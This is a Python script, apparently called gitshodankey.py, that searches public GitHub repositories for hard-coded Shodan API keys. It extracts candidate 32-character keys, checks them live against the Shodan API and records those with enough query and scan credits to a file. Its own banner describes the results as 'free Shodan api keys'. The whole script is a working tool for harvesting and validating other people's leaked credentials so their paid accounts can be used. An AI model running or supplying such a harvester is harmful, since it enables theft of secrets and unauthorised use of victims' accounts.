import sys
import time
import datetime

from shodan import Shodan
from github import Github


def clean(o):
    ls = []
    keyList = []

    with open(o, 'r+') as f:
        for line in f.readlines():
            if line.split(" ")[0] not in keyList:
                ls.append(line)
                keyList.append(line.split(" ")[0])

    with open(o, 'w') as f:
        for l in ls:
            f.write(l)


def check(k, o):
    try:
        shodan_api = Shodan(k)
        if shodan_api.info()['query_credits'] >= 50:
            print("Key Found!")
            with open(o, 'a+') as f:
                f.write(k + " Credits: " + str(shodan_api.info()['query_credits']) + " Scans: " + str(shodan_api.info()['scan_credits']) + "\n")
    except:
        pass


def search(t, o, k, l):
    api = None
    repos = None

    try:
        api = Github(t)
        api.per_page = 1
        repos = api.search_code(l + k)
    except Exception as e:
        if "rate limit" in str(e):
            time.sleep(150)
            api = Github(t)
            api.per_page = 1
            repos = api.search_code(l + k)
            pass

    for i in range(0, repos.totalCount):
        try:
            if i % 100 == 0:
                if api.get_rate_limit().core.remaining.real <= 100:
                    print("Github rate limit exceeded. Waiting for reset: " + str(api.get_rate_limit().core.reset.time()) + " GMT")
                    while api.get_rate_limit().core.remaining.real <= 10:
                        time.sleep(10)
                    print("Resume searching ...")

            lines = str(repos.get_page(i)[0].decoded_content, 'utf-8').split("\n")

            for line in lines:
                original = line
                line = line.strip().lower().replace(' ', '')

                if k + '"' in line:
                    split = original.split('"')
                    if len(split[1]) == 32:
                        check(split[1], o)
                elif k + "'" in line:
                    split = original.split("'")
                    if len(split[1]) == 32:
                        check(split[1], o)

        except Exception as e:
            if "rate limit" in str(e):
                time.sleep(30)
                i -= 1
                pass


try:
    if len(sys.argv) != 3:
        print("Usage: gitshodankey.py <github-api-token> <keys.out>")
        exit()

    print("Searching for free Shodan api keys in public Github repositories.\nPlease keep in mind that this will take a few hours!\n")

    keywordFiles = ["keywords/shodan-python.txt"]
    language = None

    for keywordFile in keywordFiles:
        if "python" in keywordFile: language = "language:python "

        keywordList = []
        with open(keywordFile, 'r+') as f:
            for l in f.readlines():
                keywordList.append(l.removesuffix("\n"))

        try:
            for keyword in keywordList:
                dt = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                print(dt + " - Searching with query: '" + language + keyword + "'")
                search(sys.argv[1], sys.argv[2], keyword, language)

            clean(sys.argv[2])

        except Exception as e:
            print("\nError: " + str(e) + "\n")
            print("Usage: gitshodankey.py <github-api-token> <keys.out>")
            exit()

except KeyboardInterrupt:
    exit()

